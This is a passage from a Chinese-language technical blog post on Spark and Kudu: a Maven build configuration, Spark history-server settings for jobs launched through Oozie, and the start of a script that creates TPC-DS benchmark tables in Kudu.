class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>anlogSparkSQL<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置项目编译版本--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 用于编译scala代码到class --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.alchim31.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>scala-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testCompile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>kuduimport.hiveToKudu<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用HUE里面的<code>Oozie</code>调用Spark程序的时候，如果想要在spark提交里面出现任务记录，应该添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--conf spark.shuffle.memoryFraction=0.3</span><br><span class="line">--conf spark.yarn.historyServer.address=http://datanode127:18089</span><br><span class="line">--conf spark.eventLog.dir=hdfs://master126:8020/user/spark/spark2ApplicationHistory</span><br><span class="line">--conf spark.eventLog.enabled=true</span><br></pre></td></tr></table></figure><p><a href="https://github.com/YunKillerE/kudu-learning" target="_blank" rel="noopener">github/kudu-learning</a></p><hr><h4 id="2-自动生成Kudu表格脚本"><a href="#2-自动生成Kudu表格脚本" class="headerlink" title="2.自动生成Kudu表格脚本"></a>2.自动生成Kudu表格脚本</h4><p>脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br></pre></td><td class="code"><pre><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists call_center;</span><br><span class="line"></span><br><span class="line">create table call_center(</span><br><span class="line">      cc_call_center_sk         bigint               </span><br><span class="line">,     cc_call_center_id         string              </span><br><span class="line">,     cc_rec_start_date        string                         </span><br><span class="line">,     cc_rec_end_date          string                         </span><br><span class="line">,     cc_closed_date_sk         bigint                       </span><br><span class="line">,     cc_open_date_sk           bigint                       </span><br><span class="line">,     cc_name                   string                   </span><br><span class="line">,     cc_class                  string                   </span><br><span class="line">,     cc_employees              int                       </span><br><span class="line">,     cc_sq_ft                  int                       </span><br><span class="line">,     cc_hours                  string                      </span><br><span class="line">,     cc_manager                string                   </span><br><span class="line">,     cc_mkt_id                 int                       </span><br><span class="line">,     cc_mkt_class              string                      </span><br><span class="line">,     cc_mkt_desc               string                  </span><br><span class="line">,     cc_market_manager         string                   </span><br><span class="line">,     cc_division               int                       </span><br><span class="line">,     cc_division_name          string                   </span><br><span class="line">,     cc_company                int                       </span><br><span class="line">,     cc_company_name           string                      </span><br><span class="line">,     cc_street_number          string                      </span><br><span class="line">,     cc_street_name            string                   </span><br><span class="line">,     cc_street_type            string                      </span><br><span class="line">,     cc_suite_number           string                      </span><br><span class="line">,     cc_city                   string                   </span><br><span class="line">,     cc_county                 string                   </span><br><span class="line">,     cc_state                  string                       </span><br><span class="line">,     cc_zip                    string                      </span><br><span class="line">,     cc_country                string                   </span><br><span class="line">,     cc_gmt_offset             double                  </span><br><span class="line">,     cc_tax_percentage         double</span><br><span class="line">,PRIMARY KEY(cc_call_center_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists catalog_page;</span><br><span class="line"></span><br><span class="line">create table catalog_page(</span><br><span class="line">      cp_catalog_page_sk        bigint               </span><br><span class="line">,     cp_catalog_page_id        string              </span><br><span class="line">,     cp_start_date_sk          bigint                       </span><br><span class="line">,     cp_end_date_sk            bigint                       </span><br><span class="line">,     cp_department             string                   </span><br><span class="line">,     cp_catalog_number         int                       </span><br><span class="line">,     cp_catalog_page_number    int                       </span><br><span class="line">,     cp_description            string                  </span><br><span class="line">,     cp_type                   string</span><br><span class="line">,PRIMARY KEY(cp_catalog_page_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists catalog_returns;</span><br><span class="line"></span><br><span class="line">create table catalog_returns</span><br><span class="line">(</span><br><span class="line">    cr_item_sk                bigint,</span><br><span class="line">cr_order_number           bigint,</span><br><span class="line">    cr_returned_date_sk       bigint,</span><br><span class="line">    cr_returned_time_sk       bigint,</span><br><span class="line">    cr_refunded_customer_sk   bigint,</span><br><span class="line">    cr_refunded_cdemo_sk      bigint,</span><br><span class="line">    cr_refunded_hdemo_sk      bigint,</span><br><span class="line">    cr_refunded_addr_sk       bigint,</span><br><span class="line">    cr_returning_customer_sk  bigint,</span><br><span class="line">    cr_returning_cdemo_sk     bigint,</span><br><span class="line">    cr_returning_hdemo_sk     bigint,</span><br><span class="line">    cr_returning_addr_sk      bigint,</span><br><span class="line">    cr_call_center_sk         bigint,</span><br><span class="line">    cr_catalog_page_sk        bigint,</span><br><span class="line">    cr_ship_mode_sk           bigint,</span><br><span class="line">    cr_warehouse_sk           bigint,</span><br><span class="line">    cr_reason_sk              bigint,</span><br><span class="line">    cr_return_quantity        int,</span><br><span class="line">    cr_return_amount          double,</span><br><span class="line">    cr_return_tax             double,</span><br><span class="line">    cr_return_amt_inc_tax     double,</span><br><span class="line">    cr_fee                    double,</span><br><span class="line">    cr_return_ship_cost       double,</span><br><span class="line">    cr_refunded_cash          double,</span><br><span class="line">    cr_reversed_charge        double,</span><br><span class="line">    cr_store_credit           double,</span><br><span class="line">    cr_net_loss               double</span><br><span class="line">,PRIMARY KEY(cr_item_sk,cr_order_number)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (cr_item_sk) PARTITIONS 16</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists catalog_sales;</span><br><span class="line"></span><br><span class="line">create table catalog_sales</span><br><span class="line">(</span><br><span class="line">    cs_item_sk                bigint,</span><br><span class="line">    cs_order_number           bigint,</span><br><span class="line">    cs_sold_date_sk           bigint,</span><br><span class="line">    cs_sold_time_sk           bigint,</span><br><span class="line">    cs_ship_date_sk           bigint,</span><br><span class="line">    cs_bill_customer_sk       bigint,</span><br><span class="line">    cs_bill_cdemo_sk          bigint,</span><br><span class="line">    cs_bill_hdemo_sk          bigint,</span><br><span class="line">    cs_bill_addr_sk           bigint,</span><br><span class="line">    cs_ship_customer_sk       bigint,</span><br><span class="line">    cs_ship_cdemo_sk          bigint,</span><br><span class="line">    cs_ship_hdemo_sk          bigint,</span><br><span class="line">    cs_ship_addr_sk           bigint,</span><br><span class="line">    cs_call_center_sk         bigint,</span><br><span class="line">    cs_catalog_page_sk        bigint,</span><br><span class="line">    cs_ship_mode_sk           bigint,</span><br><span class="line">    cs_warehouse_sk           bigint,</span><br><span class="line">    cs_promo_sk               bigint,</span><br><span class="line">    cs_quantity               int,</span><br><span class="line">    cs_wholesale_cost         double,</span><br><span class="line">    cs_list_price             double,</span><br><span class="line">    cs_sales_price            double,</span><br><span class="line">    cs_ext_discount_amt       double,</span><br><span class="line">    cs_ext_sales_price        double,</span><br><span class="line">    cs_ext_wholesale_cost     double,</span><br><span class="line">    cs_ext_list_price         double,</span><br><span class="line">    cs_ext_tax                double,</span><br><span class="line">    cs_coupon_amt             double,</span><br><span class="line">    cs_ext_ship_cost          double,</span><br><span class="line">    cs_net_paid               double,</span><br><span class="line">    cs_net_paid_inc_tax       double,</span><br><span class="line">    cs_net_paid_inc_ship      double,</span><br><span class="line">    cs_net_paid_inc_ship_tax  double,</span><br><span class="line">    cs_net_profit             double</span><br><span class="line">,PRIMARY KEY(cs_item_sk,cs_order_number)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (cs_item_sk) 